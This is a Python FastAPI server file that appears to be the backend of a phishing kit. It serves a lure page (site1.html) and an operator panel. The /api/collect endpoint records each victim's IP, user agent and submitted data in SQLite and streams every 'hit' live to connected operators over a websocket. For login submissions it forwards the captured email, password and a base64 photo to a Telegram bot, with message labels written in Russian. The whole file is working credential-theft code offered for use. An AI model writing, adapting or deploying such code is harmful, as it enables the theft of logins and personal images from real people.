from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
from contextlib import asynccontextmanager
import sqlite3, json, time, uuid, os, urllib.request, base64, threading

DB_PATH = os.path.join(os.path.dirname(__file__), "hits.db")
OPERATORS = set()
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

def init_db():
    c = sqlite3.connect(DB_PATH)
    c.execute("""
        CREATE TABLE IF NOT EXISTS hits(
            id TEXT PRIMARY KEY,
            ts REAL,
            ip TEXT,
            ua TEXT,
            data TEXT
        )
    """)
    c.commit()
    c.close()

@asynccontextmanager
async def lifespan(app: FastAPI):
    init_db()
    yield

app = FastAPI(lifespan=lifespan)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

async def broadcast(payload: dict):
    dead = []
    for ws in OPERATORS:
        try:
            await ws.send_json(payload)
        except Exception:
            dead.append(ws)
    for ws in dead:
        OPERATORS.discard(ws)

@app.websocket("/ws/operator")
async def operator_ws(ws: WebSocket):
    await ws.accept()
    OPERATORS.add(ws)
    try:
        while True:
            await ws.receive_text()
    except WebSocketDisconnect:
        pass
    finally:
        OPERATORS.discard(ws)

def send_to_telegram(rec):
    if not BOT_TOKEN or not CHAT_ID:
        print("Telegram: No token or chat_id")
        return
    try:
        data = rec.get("data", {})
        if data.get("type") != "login":
            return
            
        text = f"🔥 Новый вход\n"
        text += f"🌐 IP: {rec['ip']}\n"
        text += f"📧 Email: {data.get('email')}\n"
        text += f"🔑 Пароль: {data.get('password')}\n"
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        req = urllib.request.Request(url, data=json.dumps({"chat_id": CHAT_ID, "text": text}).encode(), headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=5)
        
        photo_b64 = data.get("photo")
        if photo_b64 and photo_b64.startswith("data:image"):
            img_data = base64.b64decode(photo_b64.split(",")[1])
            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
            body = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="photo"; filename="photo.jpg"\r\n'
                f"Content-Type: image/jpeg\r\n\r\n"
            ).encode() + img_data + f"\r\n--{boundary}--\r\n".encode()
            
            req_photo = urllib.request.Request(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data=body,
                headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
            )
            urllib.request.urlopen(req_photo, timeout=10)
    except Exception as e:
        print("Telegram error:", e)

@app.post("/api/collect")
async def collect(req: Request, body: dict):
    rec = {
        "id": str(uuid.uuid4()),
        "ts": time.time(),
        "ip": req.headers.get("x-forwarded-for", req.client.host).split(",")[0].strip(),
        "ua": req.headers.get("user-agent", ""),
        "data": body,
    }
    
    threading.Thread(target=send_to_telegram, args=(rec,)).start()

    try:
        c = sqlite3.connect(DB_PATH)
        c.execute(
            "INSERT INTO hits VALUES(?,?,?,?,?)",
            (rec["id"], rec["ts"], rec["ip"], rec["ua"], json.dumps(body, default=str)),
        )
        c.commit()
        c.close()
    except Exception as e:
        print("DB ERROR:", e)
    
    await broadcast(rec)
    return {"ok": True}

@app.get("/api/hits")
def hits(limit: int = 200):
    try:
        c = sqlite3.connect(DB_PATH)
        rows = c.execute(
            "SELECT id, ts, ip, ua, data FROM hits ORDER BY ts DESC LIMIT ?", (limit,)
        ).fetchall()
        c.close()
        return [
            {"id": r[0], "ts": r[1], "ip": r[2], "ua": r[3], "data": json.loads(r[4])}
            for r in rows
        ]
    except Exception:
        return []

@app.get("/")
def site1():
    return FileResponse(os.path.join(os.path.dirname(__file__), "site1.html"))

@app.get("/panel")
def site2():
    return FileResponse(os.path.join(os.path.dirname(__file__), "site2.html"))
